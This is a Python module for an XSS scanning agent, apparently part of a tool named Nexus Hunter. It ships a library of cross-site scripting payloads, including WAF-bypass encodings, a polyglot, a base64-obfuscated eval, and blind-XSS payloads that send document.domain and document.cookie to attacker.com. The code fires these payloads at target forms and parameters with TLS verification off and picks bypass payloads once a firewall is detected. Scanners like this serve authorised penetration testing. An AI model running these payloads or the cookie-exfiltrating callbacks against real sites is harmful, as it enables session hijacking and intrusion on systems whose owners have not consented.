"""
Advanced XSS Agent for Nexus Hunter
Context-aware XSS detection with WAF bypass techniques (XSStrike equivalent)
"""

import asyncio
import base64
import html
import json
import re
import urllib.parse
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass

import httpx
from bs4 import BeautifulSoup
from loguru import logger

from agents.base import BaseAgent


@dataclass
class XSSPayload:
    """Advanced XSS payload with context information"""
    name: str
    payload: str
    description: str
    category: str
    severity: str
    context: str
    bypass_technique: str
    detection_method: str


class AdvancedXSSAgent(BaseAgent):
    """Advanced XSS detection with context-awareness and WAF bypass"""
    
    def __init__(self):
        super().__init__("AdvancedXSSAgent")
        self.xss_payloads = self._initialize_advanced_payloads()
        self.discovered_vulnerabilities: List[Dict[str, Any]] = []
        self.tested_endpoints: Set[str] = set()
        self.waf_detected = False
        
        # Safety and performance constraints
        self.max_requests_per_endpoint = 20
        self.request_delay = 1.0
        self.max_concurrent_tests = 3
        
        # Context detection patterns
        self.context_patterns = {
            "html_attribute": r'<[^>]*\s+\w+=["\']?[^"\']*{payload}[^"\']*["\']?[^>]*>',
            "html_tag": r'<[^>]*>{payload}<\/[^>]*>',
            "script_context": r'<script[^>]*>[^<]*{payload}[^<]*<\/script>',
            "style_context": r'<style[^>]*>[^<]*{payload}[^<]*<\/style>',
            "javascript": r'var\s+\w+\s*=\s*["\'][^"\']*{payload}[^"\']*["\']',
            "json_context": r'\{[^}]*["\'][^"\']*{payload}[^"\']*["\'][^}]*\}',
            "url_parameter": r'[?&]\w+=[^&]*{payload}[^&]*',
            "comment_context": r'<!--[^>]*{payload}[^>]*-->'
        }
        
        # WAF detection signatures
        self.waf_signatures = {
            "cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
            "akamai": ["akamai", "ghost", "ak-bmsc"],
            "aws_waf": ["x-amzn-requestid", "x-amz-apigw-id"],
            "sucuri": ["sucuri", "x-sucuri-id"],
            "imperva": ["x-iinfo", "visid_incap"],
            "f5": ["f5-bigip", "x-waf-event"],
            "mod_security": ["mod_security", "x-mod-security"],
            "fortinet": ["fortigate", "x-fw-info"]
        }
    
    def _initialize_advanced_payloads(self) -> Dict[str, List[XSSPayload]]:
        """Initialize advanced XSS payloads with context awareness"""
        return {
            "basic_reflection": [
                XSSPayload(
                    name="Basic Script Alert",
                    payload="<script>alert('XSS')</script>",
                    description="Basic script tag XSS test",
                    category="Reflected XSS",
                    severity="medium",
                    context="html_tag",
                    bypass_technique="none",
                    detection_method="dom_analysis"
                ),
                XSSPayload(
                    name="IMG Onerror",
                    payload="<img src=x onerror=alert('XSS')>",
                    description="Image tag with onerror event",
                    category="Reflected XSS",
                    severity="medium",
                    context="html_tag",
                    bypass_technique="event_handler",
                    detection_method="dom_analysis"
                ),
                XSSPayload(
                    name="SVG Onload",
                    payload="<svg onload=alert('XSS')>",
                    description="SVG tag with onload event",
                    category="Reflected XSS",
                    severity="medium",
                    context="html_tag",
                    bypass_technique="alternative_tag",
                    detection_method="dom_analysis"
                )
            ],
            "context_aware": [
                XSSPayload(
                    name="Attribute Context Escape",
                    payload="\" onmouseover=\"alert('XSS')\"",
                    description="Escape HTML attribute context",
                    category="Context-Aware XSS",
                    severity="high",
                    context="html_attribute",
                    bypass_technique="attribute_escape",
                    detection_method="context_analysis"
                ),
                XSSPayload(
                    name="JavaScript String Escape",
                    payload="'; alert('XSS'); //",
                    description="Escape JavaScript string context",
                    category="Context-Aware XSS",
                    severity="high",
                    context="javascript",
                    bypass_technique="string_escape",
                    detection_method="context_analysis"
                ),
                XSSPayload(
                    name="JSON Context Escape",
                    payload="\", \"xss\": \"alert('XSS')\", \"",
                    description="Escape JSON context",
                    category="Context-Aware XSS",
                    severity="high",
                    context="json_context",
                    bypass_technique="json_escape",
                    detection_method="context_analysis"
                )
            ],
            "waf_bypass": [
                XSSPayload(
                    name="Case Variation Bypass",
                    payload="<ScRiPt>alert('XSS')</ScRiPt>",
                    description="Case variation to bypass filters",
                    category="WAF Bypass",
                    severity="medium",
                    context="html_tag",
                    bypass_technique="case_variation",
                    detection_method="dom_analysis"
                ),
                XSSPayload(
                    name="HTML Entity Encoding",
                    payload="&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
                    description="HTML entity encoding bypass",
                    category="WAF Bypass",
                    severity="medium",
                    context="html_tag",
                    bypass_technique="html_encoding",
                    detection_method="dom_analysis"
                ),
                XSSPayload(
                    name="Unicode Encoding",
                    payload="<script>alert(\\u0027XSS\\u0027)</script>",
                    description="Unicode encoding bypass",
                    category="WAF Bypass",
                    severity="medium",
                    context="html_tag",
                    bypass_technique="unicode_encoding",
                    detection_method="dom_analysis"
                ),
                XSSPayload(
                    name="Double URL Encoding",
                    payload="%253cscript%253ealert('XSS')%253c/script%253e",
                    description="Double URL encoding bypass",
                    category="WAF Bypass",
                    severity="medium",
                    context="url_parameter",
                    bypass_technique="double_encoding",
                    detection_method="dom_analysis"
                )
            ],
            "polyglot_payloads": [
                XSSPayload(
                    name="Universal Polyglot",
                    payload="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                    description="Universal XSS polyglot payload",
                    category="Polyglot XSS",
                    severity="high",
                    context="universal",
                    bypass_technique="polyglot",
                    detection_method="dom_analysis"
                ),
                XSSPayload(
                    name="Context-Independent Polyglot",
                    payload="'\"()/><img/src/onerror=alert()//>",
                    description="Context-independent polyglot",
                    category="Polyglot XSS",
                    severity="high",
                    context="universal",
                    bypass_technique="polyglot",
                    detection_method="dom_analysis"
                )
            ],
            "dom_xss": [
                XSSPayload(
                    name="Location Hash DOM XSS",
                    payload="<img src=x onerror=alert(document.domain)>",
                    description="DOM XSS via location.hash",
                    category="DOM XSS",
                    severity="high",
                    context="dom_sink",
                    bypass_technique="dom_manipulation",
                    detection_method="dom_source_sink"
                ),
                XSSPayload(
                    name="InnerHTML DOM XSS",
                    payload="<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>",
                    description="DOM XSS via innerHTML sink",
                    category="DOM XSS",
                    severity="high",
                    context="dom_sink",
                    bypass_technique="base64_encoding",
                    detection_method="dom_source_sink"
                )
            ],
            "blind_xss": [
                XSSPayload(
                    name="Callback-based Blind XSS",
                    payload="<script>var i=new Image;i.src='http://attacker.com/log?xss='+document.domain;</script>",
                    description="Blind XSS with image callback",
                    category="Blind XSS",
                    severity="high",
                    context="html_tag",
                    bypass_technique="external_callback",
                    detection_method="callback_detection"
                ),
                XSSPayload(
                    name="WebSocket Blind XSS",
                    payload="<script>var ws=new WebSocket('ws://attacker.com/xss');ws.send(document.cookie);</script>",
                    description="Blind XSS using WebSocket",
                    category="Blind XSS",
                    severity="high",
                    context="html_tag",
                    bypass_technique="websocket_callback",
                    detection_method="callback_detection"
                )
            ]
        }
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute advanced XSS testing with the given configuration"""
        config = config or {}
        return await self.scan(target, **config)
    
    async def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Perform advanced XSS vulnerability assessment
        
        Args:
            target: Target URL to test for XSS
            **kwargs: Additional scan options
        """
        try:
            results = {
                "target": target,
                "vulnerabilities": [],
                "tested_parameters": [],
                "context_analysis": {},
                "waf_detection": {},
                "blind_xss_results": [],
                "statistics": {}
            }
            
            self.logger.info(f"Starting advanced XSS scan for {target}")
            
            # Normalize target URL to include protocol
            if not target.startswith(('http://', 'https://')):
                target = f"http://{target}"
            
            # Detect WAF presence
            waf_info = await self._detect_waf(target)
            results["waf_detection"] = waf_info
            self.waf_detected = waf_info.get("waf_detected", False)
            
            # Discover XSS injection points
            injection_points = await self._discover_injection_points(target)
            results["tested_parameters"] = injection_points
            
            # Perform context-aware XSS testing
            for injection_point in injection_points:
                context_info = await self._analyze_context(injection_point)
                results["context_analysis"][injection_point["name"]] = context_info
                
                # Test XSS based on context
                xss_results = await self._test_context_aware_xss(injection_point, context_info, **kwargs)
                if xss_results:
                    results["vulnerabilities"].extend(xss_results)
            
            # Test for DOM-based XSS
            dom_results = await self._test_dom_xss(target, **kwargs)
            if dom_results:
                results["vulnerabilities"].extend(dom_results)
            
            # Test for blind XSS if enabled
            if kwargs.get("test_blind_xss", False):
                blind_results = await self._test_blind_xss(target, **kwargs)
                results["blind_xss_results"] = blind_results
            
            # Analyze and categorize results
            results = await self._analyze_xss_results(results)
            
            self.logger.info(f"Advanced XSS scan completed for {target}")
            return results
            
        except Exception as e:
            self.logger.error(f"Advanced XSS scan failed: {e}")
            return {"error": str(e), "target": target}
    
    async def _detect_waf(self, target: str) -> Dict[str, Any]:
        """Detect Web Application Firewall presence"""
        try:
            waf_info = {
                "waf_detected": False,
                "waf_type": None,
                "detection_evidence": []
            }
            
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Send a malicious request to trigger WAF
                test_payload = "<script>alert('xss')</script>"
                
                # Test via parameter
                response = await client.get(f"{target}?test={test_payload}")
                headers = response.headers
                
                # Check headers for WAF signatures
                for waf_name, signatures in self.waf_signatures.items():
                    for signature in signatures:
                        if signature.lower() in str(headers).lower():
                            waf_info["waf_detected"] = True
                            waf_info["waf_type"] = waf_name
                            waf_info["detection_evidence"].append(f"Header signature: {signature}")
                            break
                
                # Check response content for WAF indicators
                response_text = response.text.lower()
                waf_indicators = [
                    "blocked", "access denied", "security violation", "waf", 
                    "web application firewall", "suspicious activity",
                    "request blocked", "security filter"
                ]
                
                for indicator in waf_indicators:
                    if indicator in response_text:
                        waf_info["waf_detected"] = True
                        waf_info["detection_evidence"].append(f"Content indicator: {indicator}")
                
                # Check status codes
                if response.status_code in [403, 406, 429, 501, 503]:
                    waf_info["detection_evidence"].append(f"Suspicious status code: {response.status_code}")
            
            return waf_info
            
        except Exception as e:
            self.logger.error(f"WAF detection failed: {e}")
            return {"waf_detected": False, "error": str(e)}
    
    async def _discover_injection_points(self, target: str) -> List[Dict[str, Any]]:
        """Discover potential XSS injection points"""
        injection_points = []
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Get the page to find forms and parameters
                response = await client.get(target)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find form parameters
                forms = soup.find_all('form')
                for form in forms:
                    action = form.get('action', target)
                    method = form.get('method', 'GET').upper()
                    
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    for input_elem in inputs:
                        input_type = input_elem.get('type', 'text')
                        name = input_elem.get('name')
                        
                        if name and input_type not in ['submit', 'button', 'hidden']:
                            injection_points.append({
                                "name": name,
                                "type": "form_parameter",
                                "method": method,
                                "form_action": action,
                                "input_type": input_type,
                                "context": "form"
                            })
                
                # Find URL parameters
                if '?' in target:
                    url_params = urllib.parse.parse_qs(urllib.parse.urlparse(target).query)
                    for param_name in url_params:
                        injection_points.append({
                            "name": param_name,
                            "type": "url_parameter",
                            "method": "GET",
                            "context": "url"
                        })
                
                # Add common parameter names if none found
                if not injection_points:
                    common_params = ["q", "search", "query", "name", "comment", "message", "input", "data"]
                    for param in common_params:
                        injection_points.append({
                            "name": param,
                            "type": "test_parameter",
                            "method": "GET",
                            "context": "test"
                        })
        
        except Exception as e:
            self.logger.error(f"Injection point discovery failed: {e}")
        
        return injection_points
    
    async def _analyze_context(self, injection_point: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze the context where the parameter appears"""
        try:
            context_info = {
                "context_type": "unknown",
                "reflection_point": None,
                "filters_detected": [],
                "encoding_detected": []
            }
            
            # Test with a unique marker to find reflection
            test_marker = "XSS_CONTEXT_TEST_12345"
            
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                if injection_point["method"] == "GET":
                    test_url = f"{injection_point.get('form_action', '')}?{injection_point['name']}={test_marker}"
                    response = await client.get(test_url)
                else:
                    data = {injection_point["name"]: test_marker}
                    response = await client.post(injection_point.get('form_action', ''), data=data)
                
                response_text = response.text
                
                # Check if parameter is reflected
                if test_marker in response_text:
                    context_info["reflection_point"] = "found"
                    
                    # Analyze context using patterns
                    for context_type, pattern in self.context_patterns.items():
                        if re.search(pattern.format(payload=test_marker), response_text, re.IGNORECASE):
                            context_info["context_type"] = context_type
                            break
                    
                    # Check for encoding
                    encoded_marker = html.escape(test_marker)
                    if encoded_marker in response_text:
                        context_info["encoding_detected"].append("html_encoding")
                    
                    url_encoded_marker = urllib.parse.quote(test_marker)
                    if url_encoded_marker in response_text:
                        context_info["encoding_detected"].append("url_encoding")
                
                # Test for basic filters
                filter_tests = ["<script>", "javascript:", "onerror=", "onload="]
                for filter_test in filter_tests:
                    test_url = f"{injection_point.get('form_action', '')}?{injection_point['name']}={filter_test}"
                    filter_response = await client.get(test_url)
                    
                    if filter_test not in filter_response.text and test_marker in response_text:
                        context_info["filters_detected"].append(f"Filter detected for: {filter_test}")
            
            return context_info
            
        except Exception as e:
            self.logger.error(f"Context analysis failed: {e}")
            return {"context_type": "unknown", "error": str(e)}
    
    async def _test_context_aware_xss(self, injection_point: Dict[str, Any], 
                                    context_info: Dict[str, Any], **kwargs) -> List[Dict[str, Any]]:
        """Test XSS based on detected context"""
        vulnerabilities = []
        
        try:
            context_type = context_info.get("context_type", "unknown")
            
            # Select appropriate payloads based on context and WAF
            payload_categories = ["basic_reflection"]
            
            if context_type != "unknown":
                payload_categories.append("context_aware")
            
            if self.waf_detected:
                payload_categories.extend(["waf_bypass", "polyglot_payloads"])
            else:
                payload_categories.extend(["polyglot_payloads"])
            
            async with httpx.AsyncClient(timeout=15, verify=False) as client:
                for category in payload_categories:
                    payloads = self.xss_payloads.get(category, [])
                    
                    for payload in payloads[:3]:  # Limit payloads per category
                        # Skip if payload doesn't match context
                        if payload.context != "universal" and payload.context != context_type:
                            continue
                        
                        vuln = await self._test_single_xss_payload(
                            client, injection_point, payload, context_info, **kwargs
                        )
                        if vuln:
                            vulnerabilities.append(vuln)
                        
                        await asyncio.sleep(self.request_delay)
        
        except Exception as e:
            self.logger.error(f"Context-aware XSS testing failed: {e}")
        
        return vulnerabilities
    
    async def _test_single_xss_payload(self, client: httpx.AsyncClient, injection_point: Dict[str, Any], 
                                     payload: XSSPayload, context_info: Dict[str, Any], 
                                     **kwargs) -> Optional[Dict[str, Any]]:
        """Test a single XSS payload"""
        try:
            target_url = injection_point.get('form_action', '')
            param_name = injection_point["name"]
            
            if injection_point["method"] == "GET":
                test_url = f"{target_url}?{param_name}={urllib.parse.quote(payload.payload)}"
                response = await client.get(test_url)
            else:
                data = {param_name: payload.payload}
                response = await client.post(target_url, data=data)
            
            # Analyze response for XSS indicators
            is_vulnerable, evidence = await self._analyze_xss_response(response, payload, context_info)
            
            if is_vulnerable:
                return {
                    "parameter": param_name,
                    "method": injection_point["method"],
                    "payload": payload.payload,
                    "payload_name": payload.name,
                    "category": payload.category,
                    "severity": payload.severity,
                    "description": payload.description,
                    "context": payload.context,
                    "bypass_technique": payload.bypass_technique,
                    "evidence": evidence,
                    "status_code": response.status_code,
                    "vulnerability_type": "XSS",
                    "injection_point": injection_point,
                    "context_info": context_info
                }
        
        except Exception as e:
            self.logger.debug(f"XSS payload test failed: {e}")
        
        return None
    
    async def _analyze_xss_response(self, response: httpx.Response, payload: XSSPayload, 
                                  context_info: Dict[str, Any]) -> Tuple[bool, str]:
        """Analyze response for XSS vulnerability indicators"""
        try:
            evidence_indicators = []
            response_text = response.text
            
            # Check for direct payload reflection without encoding
            if payload.payload in response_text:
                evidence_indicators.append("Payload reflected without encoding")
            
            # Check for partial payload reflection
            payload_parts = ["<script", "alert(", "onerror=", "onload=", "javascript:"]
            reflected_parts = [part for part in payload_parts if part.lower() in response_text.lower()]
            if reflected_parts:
                evidence_indicators.append(f"Payload parts reflected: {', '.join(reflected_parts)}")
            
            # Parse DOM to check for XSS contexts
            try:
                soup = BeautifulSoup(response_text, 'html.parser')
                
                # Check for script tags with our payload
                scripts = soup.find_all('script')
                for script in scripts:
                    if script.string and any(indicator in script.string.lower() 
                                           for indicator in ["alert", "xss", payload.payload.lower()]):
                        evidence_indicators.append("Payload found in script tag")
                
                # Check for event handlers
                all_tags = soup.find_all()
                for tag in all_tags:
                    for attr in tag.attrs:
                        if attr.startswith('on') and payload.payload.lower() in str(tag.attrs[attr]).lower():
                            evidence_indicators.append(f"Payload found in {attr} event handler")
                
                # Check for dangerous attributes
                dangerous_attrs = soup.find_all(attrs={"src": True, "href": True})
                for elem in dangerous_attrs:
                    if "javascript:" in elem.get("src", "") or "javascript:" in elem.get("href", ""):
                        evidence_indicators.append("JavaScript protocol injection detected")
            
            except Exception:
                pass  # Continue with other detection methods
            
            # Check for DOM XSS indicators if using DOM detection
            if payload.detection_method == "dom_source_sink":
                dom_indicators = ["document.write", "innerHTML", "location.hash", "eval("]
                for indicator in dom_indicators:
                    if indicator in response_text:
                        evidence_indicators.append(f"DOM sink detected: {indicator}")
            
            # Check response headers for XSS protection bypass
            headers = response.headers
            xss_protection = headers.get("x-xss-protection", "")
            if "0" in xss_protection:
                evidence_indicators.append("XSS protection disabled")
            
            csp_header = headers.get("content-security-policy", "")
            if not csp_header:
                evidence_indicators.append("No Content Security Policy")
            elif "'unsafe-inline'" in csp_header:
                evidence_indicators.append("CSP allows unsafe-inline")
            
            return len(evidence_indicators) > 0, "; ".join(evidence_indicators)
        
        except Exception as e:
            self.logger.debug(f"XSS response analysis failed: {e}")
            return False, ""
    
    async def _test_dom_xss(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Test for DOM-based XSS vulnerabilities"""
        dom_vulns = []
        
        try:
            # This would require browser automation for full DOM XSS testing
            # For now, we'll do basic source/sink analysis
            
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                response = await client.get(target)
                
                # Look for common DOM XSS patterns
                dom_sources = [
                    "location.hash", "location.search", "document.URL",
                    "window.name", "document.referrer", "postMessage"
                ]
                
                dom_sinks = [
                    "innerHTML", "outerHTML", "document.write", "eval(",
                    "setTimeout", "setInterval", "Function(", "location.href"
                ]
                
                response_text = response.text
                sources_found = [source for source in dom_sources if source in response_text]
                sinks_found = [sink for sink in dom_sinks if sink in response_text]
                
                if sources_found and sinks_found:
                    dom_vulns.append({
                        "vulnerability_type": "Potential DOM XSS",
                        "category": "DOM XSS",
                        "severity": "medium",
                        "description": "Potential DOM XSS vulnerability detected",
                        "sources_found": sources_found,
                        "sinks_found": sinks_found,
                        "evidence": f"DOM sources and sinks detected: {', '.join(sources_found)} -> {', '.join(sinks_found)}",
                        "recommendation": "Manual verification required with browser automation"
                    })
        
        except Exception as e:
            self.logger.error(f"DOM XSS testing failed: {e}")
        
        return dom_vulns
    
    async def _test_blind_xss(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Test for blind XSS vulnerabilities"""
        blind_results = []
        
        # Note: Blind XSS testing requires an external callback server
        # This is a simplified implementation
        
        try:
            blind_payloads = self.xss_payloads.get("blind_xss", [])
            
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                for payload in blind_payloads[:2]:  # Limit blind XSS tests
                    # Test in common locations where blind XSS might be stored
                    test_locations = [
                        f"{target}?comment={payload.payload}",
                        f"{target}?feedback={payload.payload}",
                        f"{target}?message={payload.payload}"
                    ]
                    
                    for location in test_locations:
                        try:
                            response = await client.get(location)
                            
                            blind_results.append({
                                "type": "blind_xss_attempt",
                                "payload": payload.payload,
                                "location": location,
                                "status_code": response.status_code,
                                "note": "Blind XSS payload submitted - monitor callback server"
                            })
                        
                        except Exception as e:
                            self.logger.debug(f"Blind XSS test failed: {e}")
        
        except Exception as e:
            self.logger.error(f"Blind XSS testing failed: {e}")
        
        return blind_results
    
    async def _analyze_xss_results(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze and categorize XSS scan results"""
        try:
            vulnerabilities = results["vulnerabilities"]
            
            # Categorize by severity
            critical_vulns = [v for v in vulnerabilities if v.get("severity") == "critical"]
            high_vulns = [v for v in vulnerabilities if v.get("severity") == "high"]
            medium_vulns = [v for v in vulnerabilities if v.get("severity") == "medium"]
            low_vulns = [v for v in vulnerabilities if v.get("severity") == "low"]
            
            # Categorize by type
            reflected_xss = [v for v in vulnerabilities if "Reflected" in v.get("category", "")]
            dom_xss = [v for v in vulnerabilities if "DOM" in v.get("category", "")]
            stored_xss = [v for v in vulnerabilities if "Stored" in v.get("category", "")]
            blind_xss = [v for v in vulnerabilities if "Blind" in v.get("category", "")]
            
            results["categorized_vulnerabilities"] = {
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns
            }
            
            results["xss_types"] = {
                "reflected": reflected_xss,
                "dom": dom_xss,
                "stored": stored_xss,
                "blind": blind_xss
            }
            
            # Calculate risk score
            risk_score = (
                len(critical_vulns) * 4 +
                len(high_vulns) * 3 +
                len(medium_vulns) * 2 +
                len(low_vulns) * 1
            )
            
            results["statistics"] = {
                "total_vulnerabilities": len(vulnerabilities),
                "critical_count": len(critical_vulns),
                "high_count": len(high_vulns),
                "medium_count": len(medium_vulns),
                "low_count": len(low_vulns),
                "parameters_tested": len(results["tested_parameters"]),
                "waf_detected": results["waf_detection"].get("waf_detected", False),
                "risk_score": risk_score,
                "risk_level": self._calculate_risk_level(risk_score)
            }
            
            results["recommendations"] = self._generate_xss_recommendations(results)
            
            return results
        
        except Exception as e:
            self.logger.error(f"XSS results analysis failed: {e}")
            return results
    
    def _calculate_risk_level(self, risk_score: int) -> str:
        """Calculate risk level based on score"""
        if risk_score >= 12:
            return "CRITICAL"
        elif risk_score >= 8:
            return "HIGH"
        elif risk_score >= 4:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _generate_xss_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate XSS-specific security recommendations"""
        recommendations = []
        
        if results["statistics"]["total_vulnerabilities"] > 0:
            recommendations.extend([
                "Implement proper input validation and sanitization",
                "Use output encoding based on context (HTML, JavaScript, URL, CSS)",
                "Implement Content Security Policy (CSP) headers",
                "Enable XSS protection headers (X-XSS-Protection)",
                "Use secure templating engines with auto-escaping",
                "Validate and sanitize all user inputs on server side"
            ])
        
        if results["xss_types"]["dom"]:
            recommendations.extend([
                "Avoid dangerous DOM manipulation methods (innerHTML, document.write)",
                "Use safe DOM methods (textContent, createTextNode)",
                "Implement client-side input validation"
            ])
        
        if results["waf_detection"]["waf_detected"]:
            recommendations.append("WAF detected - ensure it's properly configured for XSS protection")
        else:
            recommendations.append("Consider implementing a Web Application Firewall")
        
        return recommendations
    
    def get_vulnerability_types(self) -> List[str]:
        """Get types of XSS vulnerabilities this agent can detect"""
        return [
            "Reflected XSS",
            "DOM XSS",
            "Context-Aware XSS",
            "WAF Bypass XSS",
            "Polyglot XSS",
            "Blind XSS"
        ]
    
    def get_description(self) -> str:
        """Get agent description"""
        return "Advanced XSS detection agent with context-awareness, WAF bypass techniques, and comprehensive payload testing"

